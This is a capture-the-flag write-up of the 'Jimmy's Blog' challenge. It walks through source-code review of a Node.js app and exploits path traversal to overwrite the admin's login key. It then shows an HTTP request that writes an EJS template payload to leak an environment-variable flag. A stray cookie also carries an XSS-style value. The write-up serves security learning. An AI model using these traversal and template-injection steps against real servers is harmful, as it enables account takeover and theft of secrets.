
There were many challenges in this CTF, but for this one the comeplete source code was provided which you could use to setup the challenge locally so I spent more time here.

# Jimmy's Blog

https://github.com/Sudistark/sudistark.github.io/raw/main/jimmys_blog.zip

In the challenge description , it was mentioned that this application doesn't requires any password for users to get login (passwordless login mechanism).


This is how the site homepage looked like:
![firefox_b4aSIj6Xvg](https://user-images.githubusercontent.com/31372554/193503499-eaf5c6fa-fea6-4fbe-87c7-b749e65d77ad.png)



There are two articles also which can be accessed from this urls:
http://127.0.0.1:1337/article?id=1
http://127.0.0.1:1337/article?id=2

Changing the value of this `id` parameter , returns *NOt Found* error

On the registeration page it just asks for a username not password (remember as this is a passwordless mechanism site)

![image](https://user-images.githubusercontent.com/31372554/193503518-a90a732f-04f7-4d7e-b674-06471e1427b4.png)


Upon clicking on the *Get key* button, a file is downloaded named `yourusername.key`. This key will used in the login page

![image](https://user-images.githubusercontent.com/31372554/193503596-3447470d-a721-47be-a9c0-6672cedc04e2.png)


--------------


*Login Page*:

![image](https://user-images.githubusercontent.com/31372554/193503532-07ae2f0f-3b00-4f63-af29-41596251600e.png)


Request made when the user clicks on the login button:

```
POST /login HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------77228163722178869953705465670
Content-Length: 1374
Origin: http://127.0.0.1:1337
Connection: close
Referer: http://127.0.0.1:1337/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------77228163722178869953705465670
Content-Disposition: form-data; name="username"

admin
-----------------------------77228163722178869953705465670
Content-Disposition: form-data; name="key"; filename="admin.key"
Content-Type: application/octet-stream

cóåA Ç»³8µÆZ3,¢àþîB.*BõýR¯àPÓÕ¹ßÿ·5Ê§Ö³LÚN-æKáúóo´¹ñ<c¤¹ö½Íõa}øDóã¬O¬H±¤ÙQx	³W^Ä~îðTdÖXs§SËJâ<õZPÊ¹ô8 Â3­x+ñÜ
äúÐmÇùîÚWHôÔ­­@ÉVw´nãîMõd¼0'0ÎD§¹³Ò´
```

The key content is not in a readable format, if the provided key is valid you will logged in to the account.

-------------

**Source Code Review:**

After logging in there's any other functionality so let's look into the source code, to understand how the server is handling the key generation and validation process.

```js
app.post("/register", (req, res) => {
    const username = req.body.username;
    const result = utils.register(username);  // [1]
    if (result.success) res.download(result.data, username + ".key");
    else res.render("register", { error: result.data, session: req.session });
})


app.post("/login", upload.single('key'), (req, res) => {
    const username = req.body.username;
    const key = req.file;
    const result = utils.login(username, key.buffer); // [2]
    if (result.success) { 
        req.session.username = result.data.username;
        req.session.admin = result.data.admin;
        res.redirect("/");
    }
    else res.render("login", { error: result.data, session: req.session });
})
```

On line [1] and [2] you can see a call to `utils.register(username)` and  utils.login(username, key.buffer) is made respectively

First let's focus on the key generation part:

```js
register("jimmy_jammy", 1);

function register(username, admin = 0) {
    try {
        db.prepare("INSERT INTO users (username, admin) VALUES (?, ?)").run(username, admin);
    } catch {
        return { success: false, data: "Username already taken" }
    }
    const key_path = path.join(__dirname, "keys", username + ".key"); //[3]
    const contents = crypto.randomBytes(1024);
    fs.writeFileSync(key_path, contents);
    return { success: true, data: key_path };
}
```

If the username is already taken the server will return error.

`jimmy_jammy` is the admin user username

The `register` method has two arguements first is the username (which is controllable by us) and 2nd one is the admin flag (which by default is false).

The key generation part starts from line [3] , using `path.join` method the *key_path* is generated (location where the key is stored in the server)
Then it genrates randomBytes of size 1024 using the crypto module and on the last line it just writes the contents to the *key_path* file.


As there is no check/sanitzation for the username variable (which is controlled by the user), this allows the attacker to perform path traversal here.By exploiting this bug the attacker would be able to write his `username.key` file to any directory on the server.


Now focusing on the `login` method:

```js
function login(username, key) {
    const user = db.prepare("SELECT * FROM users WHERE username = ?").get(username);
    if (!user) return { success: false, data: "User does not exist" };

    if (key.length !== 1024) return { success: false, data: "Invalid access key" };
    const key_path = path.join(__dirname, "keys", username + ".key"); //[4]
    if (key.compare(fs.readFileSync(key_path)) !== 0) return { success: false, data: "Wrong access key" };
    return { success: true, data: user };
}
```

It first checks if there exist any user with that username or not in the database
On line [4] you can see that the same path traversal vuln exist here too.
On the next line, you can find the logic of the login mechanism, it just compares the content of the key provided during login and the key stored in the key_path

Normally all the keys are stored in the `/app/keys/yourusername.key` directory, so when a user with `admin` userame registers on the site. A new key will be generated under the keys directory `admin.key` and then during login the user needs to provide the key and username, the server then finds the location of corresponding key based upon the provided username and compares if the client keys matches with the key stored in the server or not.

The authentication can be easily bypasses because of the path traversal vuln which exists in both the login and register method.Our end goal is to become admin by login to jimmy_jammy's account. The user `jimmy_jammy` key location on the server is `../../../app/keys/jimmy_jammy.key`

So , the attacker will first generate the key by providing a username like this: `../../../app/keys/jimmy_jammy` , as this username doesn't already exist in the database , a key will generated for this user.

```js
 username = "../../../app/keys/jimmy_jammy.key"
 const key_path = path.join(__dirname, "keys", username + ".key")

> /app/keys/jimmy_jammy.key
```

It will end up overwriting the actual jimmy_jammy user key and basically what happened here is that the key for `jimmy_jammy` user was overwritten with key of the user `../../../app/keys/jimmy_jammy`

Now during login we will provide the username `jimmy_jammy` and the key for the `../../../app/keys/jimmy_jammy` user.
When the server will fetch the content of the `/app/keys/jimmy_jammy.key` (whcih we have overwritten) and compare it with the key provided during login they will be perfect match and we will logged in as the admin user `jimmy_jammy`

-------------------


Wait , the challenge hasn't end yet.

From the source code , we can see that the flag is visible from the `/edit` which is only accessible from the admin user.

```js
app.get("/edit", (req, res) => {
    if (!req.session.admin) return res.sendStatus(401);
    const id = parseInt(req.query.id).toString();
    const article_path = path.join("articles", id);
    try {
        const article = fs.readFileSync(article_path).toString();
        res.render("edit", { article: article, session: req.session, flag: Buffer.from("process.env.FLAG").toString('base64') });
    } catch {
        res.sendStatus(404);
    }
})
```

As we are logged in as the admin user, we should be able to view the flag right? 

![image](https://user-images.githubusercontent.com/31372554/193503713-c0d34968-d52d-4763-bc79-b5b8d1f148b9.png)


But no,because of the nginx sub_filter rule. The flag is replaced by the string *oof, that was close, glad i was here to save the day*

```conf
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        server_name _;

        location / {
			# Replace the flag so nobody steals it!
            sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';
            sub_filter_once off;
            proxy_pass http://localhost:3000;
        }
}
```

http://nginx.org/en/docs/http/ngx_http_sub_module.html

Again looking into the source code, we can spot another path traversal bug. But this time we have full control over the content of the file also

```js
app.post("/edit", (req, res) => {
    if (!req.session.admin) return res.sendStatus(401);
    try {
        fs.writeFileSync(path.join("articles", req.query.id), req.body.article.replace(/\r/g, ""));
        res.redirect("/");
    } catch {
        res.sendStatus(404);
    }
})
```

To make sure that nginx doesn't replace the flag with something else, Ithough of encoding the flag to another format. As the site uses ejs template I could overwrite any of the available template file and execute my own templates for eg: 

```js
<%= Buffer.from(process.env.FLAG,'ascii').toString("base64")%>
```

This will encode the flag to base64

Here's the request , notice the `id` parameter value , you can change it to any file which you want to overwrite as changing any other such as the .js file would require a server restart I used the template file instead :

```
POST /edit?id=../views/scripts.ejs HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://127.0.0.1:1337
Connection: close
Referer: http://127.0.0.1:1337/edit?id=1
Cookie: wp-settings-time-1=1663159225; BITBUCKETSESSIONID=CB8444D322BCB0EBA83295A2BE124807; _atl_bitbucket_remember_me=MzYwMThjZTA3OWE4ZmM4NzdmMjBiODY3NThjNWFkOTU4MGI5OTNjNjo4ODEyMzg0MTljYWVlYjcxNTQ3YWMyZWYyNTJiMmNhZTk3NWUzYjJm; DOKU_PREFS=difftype%23sidebyside%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528%2529%253E; connect.sid=s%3AaWx9KB0bw_2BGfsC-RNgVKx5NYSuVyA4.k5QJAM0yBB2%2FHSkNHR0hbZEhVroVsEUZznULHHZvfKw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

article=<%= Buffer.from(process.env.FLAG,'ascii').toString("base64")%>
```

Now when you will visit the edit page, the base64 encoded flag should be right there.

This was a really good challenge: BlackHatMEA{1475:16:6eb55fd9172620043c27f3a781bfb966e4efe6a5} 
